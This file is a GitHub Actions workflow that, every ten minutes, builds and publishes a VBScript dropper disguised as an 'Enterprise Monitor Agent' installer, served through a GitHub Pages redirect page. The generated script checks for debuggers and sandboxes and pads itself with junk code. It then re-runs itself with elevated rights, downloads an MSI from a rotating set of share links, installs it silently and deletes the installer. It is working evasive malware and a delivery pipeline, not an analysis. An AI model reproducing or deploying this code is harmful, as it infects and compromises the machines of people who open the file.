name: Update VBS

on:
  schedule:
    - cron: '*/10 * * * *'
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
    - name: Create Bulky VBS file
      run: |
        # Define your links
        links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
        
        # Get current link based on 10-minute interval
        current_minute=$(date +%M)
        link_index=$((current_minute / 10 % 10))
        current_link=${links[$link_index]}
        
        echo "Creating bulky VBS with link: $current_link"
        
        # Create a bulky VBS with lots of junk code using echo commands
        echo "' --------------------------------------------------------------------------" > file.vbs
        echo "'  Silent Installer - Enterprise Monitor Agent" >> file.vbs
        echo "' --------------------------------------------------------------------------" >> file.vbs
        echo "Option Explicit" >> file.vbs
        echo "" >> file.vbs
        echo "' System initialization variables" >> file.vbs
        echo "Dim WshShell, Fso, NetObj, EnvVars, SysInfo" >> file.vbs
        echo "Set WshShell = CreateObject(\"WScript.Shell\")" >> file.vbs
        echo "Set Fso = CreateObject(\"Scripting.FileSystemObject\")" >> file.vbs
        echo "Set NetObj = CreateObject(\"WScript.Network\")" >> file.vbs
        echo "Set EnvVars = WshShell.Environment(\"Process\")" >> file.vbs
        echo "" >> file.vbs
        echo "' Anti-analysis dummy variables" >> file.vbs
        echo "Dim dummy1, dummy2, dummy3, dummy4, dummy5" >> file.vbs
        echo "dummy1 = \"System initialization\"" >> file.vbs
        echo "dummy2 = \"Network configuration\"" >> file.vbs
        echo "dummy3 = \"Security validation\"" >> file.vbs
        echo "dummy4 = \"Performance monitoring\"" >> file.vbs
        echo "dummy5 = \"Error reporting\"" >> file.vbs
        echo "" >> file.vbs
        echo "' Fake system information collection" >> file.vbs
        echo "Function GetSystemInfo()" >> file.vbs
        echo "    Dim result" >> file.vbs
        echo "    result = NetObj.ComputerName & \"|\" & NetObj.UserName" >> file.vbs
        echo "    GetSystemInfo = result" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "' Process validation function" >> file.vbs
        echo "Function ValidateProcess(processName)" >> file.vbs
        echo "    Dim colProcesses, objProcess" >> file.vbs
        echo "    On Error Resume Next" >> file.vbs
        echo "    Set colProcesses = GetObject(\"winmgmts:\").ExecQuery(\"Select * From Win32_Process Where Name='\" & processName & \"'\")" >> file.vbs
        echo "    " >> file.vbs
        echo "    ValidateProcess = False" >> file.vbs
        echo "    For Each objProcess in colProcesses" >> file.vbs
        echo "        ValidateProcess = True" >> file.vbs
        echo "        Exit For" >> file.vbs
        echo "    Next" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "' Network adapter information" >> file.vbs
        echo "Function GetNetworkInfo()" >> file.vbs
        echo "    Dim result" >> file.vbs
        echo "    result = \"Network adapter: \" & NetObj.ComputerName" >> file.vbs
        echo "    GetNetworkInfo = result" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "' Registry operations helper" >> file.vbs
        echo "Function ReadRegKey(keyPath, valueName)" >> file.vbs
        echo "    On Error Resume Next" >> file.vbs
        echo "    ReadRegKey = WshShell.RegRead(keyPath & \"\\\" & valueName)" >> file.vbs
        echo "    If Err.Number <> 0 Then ReadRegKey = \"\"" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "' Write registry value" >> file.vbs
        echo "Sub WriteRegKey(keyPath, valueName, value)" >> file.vbs
        echo "    On Error Resume Next" >> file.vbs
        echo "    WshShell.RegWrite keyPath & \"\\\" & valueName, value, \"REG_SZ\"" >> file.vbs
        echo "End Sub" >> file.vbs
        echo "" >> file.vbs
        echo "' Encryption helper function" >> file.vbs
        echo "Function SimpleEncrypt(text)" >> file.vbs
        echo "    Dim i, result" >> file.vbs
        echo "    result = \"\"" >> file.vbs
        echo "    For i = 1 To Len(text)" >> file.vbs
        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> file.vbs
        echo "    Next" >> file.vbs
        echo "    SimpleEncrypt = result" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "' Decryption helper function" >> file.vbs
        echo "Function SimpleDecrypt(text)" >> file.vbs
        echo "    Dim i, result" >> file.vbs
        echo "    result = \"\"" >> file.vbs
        echo "    For i = 1 To Len(text)" >> file.vbs
        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> file.vbs
        echo "    Next" >> file.vbs
        echo "    SimpleDecrypt = result" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "' Check for debugger processes" >> file.vbs
        echo "Function IsDebuggerPresent()" >> file.vbs
        echo "    Dim debuggers, proc" >> file.vbs
        echo "    debuggers = Array(\"ollydbg.exe\", \"windbg.exe\", \"x64dbg.exe\", \"ida.exe\", \"ida64.exe\", \"idaq.exe\", \"idaq64.exe\", \"cheatengine.exe\", \"procmon.exe\", \"procexp.exe\")" >> file.vbs
        echo "    " >> file.vbs
        echo "    IsDebuggerPresent = False" >> file.vbs
        echo "    For Each proc In debuggers" >> file.vbs
        echo "        If ValidateProcess(proc) Then" >> file.vbs
        echo "            IsDebuggerPresent = True" >> file.vbs
        echo "            Exit For" >> file.vbs
        echo "        End If" >> file.vbs
        echo "    Next" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "' Anti-sandbox time delay" >> file.vbs
        echo "Sub AntiSandboxDelay()" >> file.vbs
        echo "    Dim startTime, endTime" >> file.vbs
        echo "    startTime = Timer" >> file.vbs
        echo "    endTime = startTime + 30 ' 30 second delay" >> file.vbs
        echo "    " >> file.vbs
        echo "    Do While Timer < endTime" >> file.vbs
        echo "        ' Do nothing - just waste time" >> file.vbs
        echo "        Dim dummy" >> file.vbs
        echo "        dummy = dummy & \"x\"" >> file.vbs
        echo "    Loop" >> file.vbs
        echo "End Sub" >> file.vbs
        echo "" >> file.vbs
        echo "' Check for mouse activity (sandbox detection)" >> file.vbs
        echo "Function HasMouseActivity()" >> file.vbs
        echo "    On Error Resume Next" >> file.vbs
        echo "    Dim objShell" >> file.vbs
        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> file.vbs
        echo "    " >> file.vbs
        echo "    ' Get mouse position twice with a small delay" >> file.vbs
        echo "    Dim pos1, pos2" >> file.vbs
        echo "    pos1 = objShell.AppActivate(\"WScript\")" >> file.vbs
        echo "    WScript.Sleep 1000" >> file.vbs
        echo "    pos2 = objShell.AppActivate(\"WScript\")" >> file.vbs
        echo "    " >> file.vbs
        echo "    ' If positions are the same, likely a sandbox" >> file.vbs
        echo "    HasMouseActivity = (pos1 <> pos2)" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "' More junk functions to add bulk" >> file.vbs
        echo "Function FakeFunction1()" >> file.vbs
        echo "    FakeFunction1 = \"Fake result 1\"" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "Function FakeFunction2()" >> file.vbs
        echo "    FakeFunction2 = \"Fake result 2\"" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "Function FakeFunction3()" >> file.vbs
        echo "    FakeFunction3 = \"Fake result 3\"" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "Function FakeFunction4()" >> file.vbs
        echo "    FakeFunction4 = \"Fake result 4\"" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "Function FakeFunction5()" >> file.vbs
        echo "    FakeFunction5 = \"Fake result 5\"" >> file.vbs
        echo "End Function" >> file.vbs
        echo "" >> file.vbs
        echo "' Main execution starts here" >> file.vbs
        echo "' Anti-analysis checks" >> file.vbs
        echo "If IsDebuggerPresent() Then WScript.Quit" >> file.vbs
        echo "" >> file.vbs
        echo "' Time-based anti-sandbox" >> file.vbs
        echo "If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit" >> file.vbs
        echo "" >> file.vbs
        echo "' Check for user activity" >> file.vbs
        echo "If Not HasMouseActivity() Then WScript.Quit" >> file.vbs
        echo "" >> file.vbs
        echo "' Additional delay to frustrate analysis" >> file.vbs
        echo "AntiSandboxDelay" >> file.vbs
        echo "" >> file.vbs
        echo "' Core functionality - download and execute" >> file.vbs
        echo "' Check for elevation" >> file.vbs
        echo "If Not WScript.Arguments.Named.Exists(\"elevated\") Then" >> file.vbs
        echo "    CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> file.vbs
        echo "    WScript.Quit" >> file.vbs
        echo "End If" >> file.vbs
        echo "" >> file.vbs
        echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell" >> file.vbs
        echo "strUrl = \"$current_link\"" >> file.vbs
        echo "strTemp = CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")" >> file.vbs
        echo "strFile = strTemp & \"\\agent_installer.msi\"" >> file.vbs
        echo "" >> file.vbs
        echo "' Download with redirect handling" >> file.vbs
        echo "Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")" >> file.vbs
        echo "objXMLHTTP.open \"GET\", strUrl, False" >> file.vbs
        echo "objXMLHTTP.send()" >> file.vbs
        echo "" >> file.vbs
        echo "' Check for any redirect (301, 302, etc.)" >> file.vbs
        echo "If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then" >> file.vbs
        echo "    strUrl = objXMLHTTP.getResponseHeader(\"Location\")" >> file.vbs
        echo "    objXMLHTTP.open \"GET\", strUrl, False" >> file.vbs
        echo "    objXMLHTTP.send()" >> file.vbs
        echo "End If" >> file.vbs
        echo "" >> file.vbs
        echo "If objXMLHTTP.Status = 200 Then" >> file.vbs
        echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> file.vbs
        echo "    objADOStream.Open" >> file.vbs
        echo "    objADOStream.Type = 1 ' Binary" >> file.vbs
        echo "    objADOStream.Write objXMLHTTP.ResponseBody" >> file.vbs
        echo "    objADOStream.Position = 0" >> file.vbs
        echo "    objADOStream.SaveToFile strFile, 2 ' Overwrite" >> file.vbs
        echo "    objADOStream.Close" >> file.vbs
        echo "" >> file.vbs
        echo "    ' Install" >> file.vbs
        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> file.vbs
        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /quiet /qn /norestart\", 0, True" >> file.vbs
        echo "" >> file.vbs
        echo "    ' Cleanup" >> file.vbs
        echo "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" >> file.vbs
        echo "    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile" >> file.vbs
        echo "End If"
        
        # Create index.html for GitHub Pages
        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=file.vbs"></head><body><p>If not redirected, <a href="file.vbs">click here</a></p></body></html>' > index.html
        
        # Commit and push the updated files
        git config --global user.email "action@github.com"
        git config --global user.name "GitHub Action"
        git add file.vbs index.html
        git commit -m "Update bulky VBS with current link" || exit 0
        git push
        
        echo "Bulky VBS file created successfully"
